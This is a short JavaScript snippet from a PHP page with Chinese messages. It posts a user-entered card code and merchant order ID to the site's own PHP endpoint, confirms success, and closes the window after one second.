   <script>
        const BASE_URL = '<?php echo $base_url; ?>';
        document.querySelector('#submit-button').addEventListener('click', function() {
            var inputField = document.querySelector('.input-field');
            var merchantOrderId = document.querySelector('#merchantOrderId').value;
            if (inputField.value !== '') {
                var formData = new FormData();
                formData.append('cardKey', inputField.value);
                formData.append('merchantOrderId', merchantOrderId);

                fetch('https://' + BASE_URL + '/qlruhhpn.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Success:', data);
                    document.getElementById('submit-button').innerHTML = '&ensp;成功';
                    inputField.disabled = true;
                    alert('提交后请耐心等待，窗口1秒后会自动关闭');
                    setTimeout(function() {
                        window.close();
                    }, 1000);
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
            } else {
                alert('请检查卡密是否输入');
            }
        });
    </script>
